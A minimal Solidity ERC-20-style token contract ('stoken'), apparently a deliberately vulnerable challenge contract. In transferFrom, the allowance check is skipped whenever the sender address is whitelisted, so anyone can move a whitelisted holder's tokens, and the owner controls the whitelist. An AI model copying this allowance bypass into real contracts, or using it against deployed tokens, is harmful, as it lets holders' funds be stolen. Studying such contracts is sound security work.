// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function balanceOf(address user) external view returns (uint256 balance);

    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract stoken {
    address public owner;
    string public name = "stoken";
    uint256 public decimals = 18;
    string public symbol = "stoken";
    uint256 public totalSupply;

    mapping(address => bool) public white_list;
    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) internal allowed;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed user, address indexed spender, uint256 amount);

    constructor(address _x314) {
        owner = msg.sender;
        white_list[_x314] = true;
    }


    function balanceOf(address user) public view returns (uint256 balance) {
        return _balances[user];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(amount <= _balances[msg.sender], "BALANCE_NOT_ENOUGH");
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(amount <= _balances[from], "BALANCE_NOT_ENOUGH");
        if(!white_list[from]){
            require(amount <= allowed[from][msg.sender], "ALLOWANCE_NOT_ENOUGH");
            allowed[from][msg.sender] = allowed[from][msg.sender] - amount;
        }
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        _balances[from] = _balances[from] - amount;
        if (to == address(0)) {
            totalSupply = totalSupply - amount;
        } else {
            _balances[to] = _balances[to] + amount;
        }
        emit Transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address user, address spender) public view returns (uint256){
        return allowed[user][spender];
    }

    function setWhiteList(address spender,bool enable) external onlyOwner {
        white_list[spender] = enable;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }
}
